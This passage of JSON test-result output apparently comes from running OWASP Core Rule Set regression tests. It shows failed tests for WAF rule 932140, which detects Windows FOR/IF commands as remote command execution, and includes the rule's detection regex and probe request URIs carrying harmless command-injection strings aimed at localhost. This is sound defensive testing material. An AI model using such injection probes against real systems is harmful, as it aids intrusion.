        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 148,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 148,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if%2Fi+a%3D%3Db+foo",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 149,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 149,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%2Fi+a%3D%3Db+foo",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 150,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 150,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%2Fi+%22a%22%3D%3D%22b%22++foo",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 151,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 151,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%2Fi+not++%22a%22%3D%3D%22b%22++foo",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 152,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 152,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+++exist+StorageServer.port+echo+yay",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
